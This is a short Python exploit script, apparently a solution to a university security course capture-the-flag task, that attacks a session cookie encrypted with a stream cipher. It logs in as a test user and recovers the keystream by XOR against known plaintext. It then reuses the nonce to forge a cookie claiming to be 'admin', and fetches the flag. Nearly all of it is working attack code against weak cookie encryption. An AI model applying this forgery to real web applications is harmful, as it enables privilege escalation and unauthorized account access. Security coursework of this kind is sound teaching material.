#!/usr/bin/env python3

import re
import requests
import base64
import json

URL = "https://t09-f7aa84e6d48d726c.itsec.sec.in.tum.de"
COOKIE_NAME = "itsec-session"
NONCE_LENGTH = 12

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

with requests.Session() as sess:
    # TODO implement exploit
    sess.get(URL)

    postData = {"username": "testuser", "password": "foobar"}
    sess.post(URL + "/login", data=postData)

    r = sess.get(URL)
    cookie = sess.cookies[COOKIE_NAME]
    data = base64.b64decode(cookie)
    ciphertext, nonce = data[:-NONCE_LENGTH], data[-NONCE_LENGTH:]
    
    plaintext = json.dumps({"user": "testuser"}).encode()
    keystream = bytes([c ^ p for c, p in zip(ciphertext, plaintext)])

    new_plaintext = json.dumps({"user": "admin"}).encode()
    new_ciphertext = bytes([k ^ p for k, p in zip(keystream[:len(new_plaintext)], new_plaintext)])

    new_cookie = base64.b64encode(new_ciphertext + nonce).decode()
    sess.cookies.set(name = COOKIE_NAME, value = new_cookie, domain = "t09-f7aa84e6d48d726c.itsec.sec.in.tum.de")

    r = sess.get(URL)
    print(extract_flag_from_string(r.text))

    # Beispielcode zum Lesen und Modifizieren eines Session-Cookies mit requests:

    #r = sess.get(f'https://scoreboard.sec.in.tum.de/scoreboard')
    #COOKIE_NAME = "session"

    # Den Cookie mit dem Namen COOKIE_NAME lesen
    #cookie = sess.cookies[COOKIE_NAME]
    #print(cookie)

    # Den Cookie mit dem Namen COOKIE_NAME für die Domain "scoreboard.sec.in.tum.de"
    # auf den Wert "asdf" setzen
    #sess.cookies.set(name = COOKIE_NAME, value="asdf", domain = "scoreboard.sec.in.tum.de")
